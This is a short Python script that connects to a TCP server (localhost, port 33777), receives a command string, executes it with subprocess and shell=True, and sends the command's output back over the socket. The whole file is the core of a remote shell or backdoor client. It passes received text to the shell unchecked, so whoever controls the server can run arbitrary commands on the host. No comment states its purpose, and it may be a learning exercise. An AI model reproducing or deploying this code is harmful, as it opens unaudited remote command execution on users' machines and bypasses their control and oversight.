import socket
import subprocess
import shlex

HOST = 'localhost' # The remote host
PORT = 33777# The same port as used by the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.connect((HOST, PORT))
  data = s.recv(1024)
  print('Received', repr(data))
  cmd = data.decode("utf-8")
  args = shlex.split(cmd)
  process = subprocess.Popen(args,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    shell=True
  )
  stdout = process.communicate()[0]
  print(stdout)
  s.sendall(stdout)

  